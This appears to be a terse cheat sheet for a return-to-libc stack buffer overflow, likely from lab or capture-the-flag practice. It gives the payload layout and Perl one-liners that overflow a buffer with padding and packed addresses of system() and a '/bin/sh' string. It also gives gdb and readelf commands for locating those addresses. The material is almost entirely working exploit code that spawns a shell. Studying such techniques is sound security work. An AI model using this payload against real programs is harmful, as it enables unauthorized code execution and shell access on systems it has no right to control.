```
               [AAAAAAAAA…A][SYSADDR][SYSRET][CMDADDR][COMMAND] 
$(perl -e 'print "A"x28 . "\xa0\x2d\xe4\xb7" . "JUNK" . "\x08\xe9\xff\xbf" . "/"x50 . "/bin/sh"')
```

# examples
```
print system -> 0xf7e1ce10

(gdb) find 0xf7de0000, 0xf7fb6000, "/bin/sh"
0xf7f5b88f
1 pattern found.
(gdb) x/s 0xf7f5b88f


0xffffcf18 + 16
0xffffcf1c
```

```
$(perl -e 'print "A"x28 . "\x10\xce\xe1\xf7" . "JUNK" . "\x1c\xcf\xff\xff" . "/"x50 . "/bin/sh"')
```


# commands

```
print system
print exit

info proc map 

readelf -l P

```

